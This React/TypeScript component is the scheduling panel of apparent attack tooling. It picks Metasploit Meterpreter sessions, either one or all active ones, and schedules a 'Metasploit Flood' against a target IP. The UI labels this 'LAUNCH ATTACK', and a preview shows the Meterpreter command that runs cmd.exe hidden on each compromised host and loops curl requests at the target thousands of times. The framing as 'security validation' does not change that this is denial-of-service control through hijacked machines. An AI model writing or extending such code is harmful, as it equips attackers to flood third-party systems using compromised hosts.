import { useRef, useState } from "react";
import type { FormEvent } from "react";
import type { MsfSession } from "../hooks/useMetasploit";
import type { ScheduleInput } from "../types";

interface ScheduleJobFormProps {
  msfSessions: MsfSession[];
  onSchedule: (input: ScheduleInput) => Promise<boolean>;
  status: string;
}

export function ScheduleJobForm({ msfSessions, onSchedule, status }: ScheduleJobFormProps) {
  const [targetIp, setTargetIp] = useState("");
  const [agentId, setAgentId] = useState("all");
  const [jobType, setJobType] = useState<"http_check" | "msf_command">("http_check");
  const [iterations, setIterations] = useState(20000);
  const [runAt, setRunAt] = useState("");
  const dateInputRef = useRef<HTMLInputElement>(null);

  const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    await onSchedule({ agentId, targetIp, runAt, type: jobType, iterations });
  };

  return (
    <section className="glass-card panel-shell panel-inner-glow fade-in-up mb-6 rounded-3xl p-6">
      <div className="relative mb-6">
        <p className="text-[11px] uppercase tracking-[0.24em] text-slate-500">Operation Execution</p>
        <h2 className="mt-1 text-2xl font-semibold text-white">Task Scheduler</h2>
        <p className="mt-2 max-w-2xl text-sm leading-6 text-slate-400">
          Configure and deploy automated security validation tasks. 
          Use <span className="text-rose-400 font-semibold">Flood Mode</span> for real-world stress testing via Metasploit.
        </p>
      </div>

      <form className="relative space-y-6" onSubmit={handleSubmit}>
        <div className="grid gap-6 md:grid-cols-3">
          <label className="flex flex-col gap-2 text-sm font-medium text-slate-300">
            Execution Mode
            <select
              className="control-select h-11"
              value={jobType}
              onChange={(e) => setJobType(e.target.value as any)}
            >
              <option value="http_check">HTTP Check (Simulation)</option>
              <option value="msf_command">Metasploit Flood (Meterpreter)</option>
            </select>
          </label>

          <label className="flex flex-col gap-2 text-sm font-medium text-slate-300">
            Target Session
            <select
              className="control-select h-11"
              value={agentId}
              onChange={(e) => setAgentId(e.target.value)}
            >
              <option value="all">All Active Sessions</option>
              {msfSessions.map((s) => (
                <option key={s.id} value={s.id}>
                  MSF-{s.id} ({s.session_host})
                </option>
              ))}
            </select>
          </label>

          <label className="flex flex-col gap-2 text-sm font-medium text-slate-300">
            Target IP Address
            <input
              className="control-input h-11"
              value={targetIp}
              onChange={(e) => setTargetIp(e.target.value)}
              placeholder="e.g. 192.168.100.53"
            />
          </label>
        </div>

        <div className="grid gap-6 md:grid-cols-3">
          <label className={`flex flex-col gap-2 text-sm font-medium transition-opacity ${jobType !== 'msf_command' ? 'opacity-40 pointer-events-none' : 'opacity-100'}`}>
            Flood Iterations (Count)
            <input
              className="control-input h-11"
              type="number"
              value={iterations}
              onChange={(e) => setIterations(parseInt(e.target.value) || 0)}
              min="1"
              placeholder="20000"
            />
          </label>

          <label className="flex flex-col gap-2 text-sm font-medium text-slate-300">
            Execution Time (Run At)
            <div className="datetime-shell h-11">
              <input
                className="control-input bg-transparent border-none"
                ref={dateInputRef}
                type="datetime-local"
                step="1"
                value={runAt}
                onChange={(e) => setRunAt(e.target.value)}
              />
              <button
                className="picker-trigger"
                onClick={() => dateInputRef.current?.showPicker?.()}
                type="button"
              >
                Pick
              </button>
            </div>
          </label>

          <div className="flex items-end">
            <button
              className={`control-button w-full h-11 font-bold tracking-wider transition-all ${
                jobType === 'msf_command' 
                ? 'bg-rose-600/20 border-rose-500/50 text-rose-400 hover:bg-rose-600/30' 
                : 'bg-emerald-600/20 border-emerald-500/50 text-emerald-400 hover:bg-emerald-600/30'
              }`}
              type="submit"
            >
              {jobType === 'msf_command' ? 'LAUNCH ATTACK' : 'SCHEDULE TASK'}
            </button>
          </div>
        </div>
      </form>

      {jobType === 'msf_command' && (
        <div className="mt-6 space-y-2">
          <p className="text-[10px] uppercase tracking-widest text-rose-500/60 font-bold">Meterpreter Command Preview</p>
          <div className="font-mono text-[11px] text-rose-400/90 bg-rose-500/5 p-3 rounded-xl border border-rose-500/20 break-all">
            execute -f cmd.exe -a "/c for /L %i in (1,1,{iterations}) do curl -s http://{targetIp || '[TARGET_IP]'}/ &gt;nul" -H
          </div>
        </div>
      )}
      
      <div className="mt-4 flex items-center gap-2">
        <div className={`w-2 h-2 rounded-full ${status === 'idle' ? 'bg-slate-600' : status.includes('Failed') ? 'bg-rose-500' : 'bg-emerald-500 animate-pulse'}`} />
        <p className="text-sm text-slate-400 font-medium">Status: <span className="text-slate-200">{status}</span></p>
      </div>
    </section>
  );
}
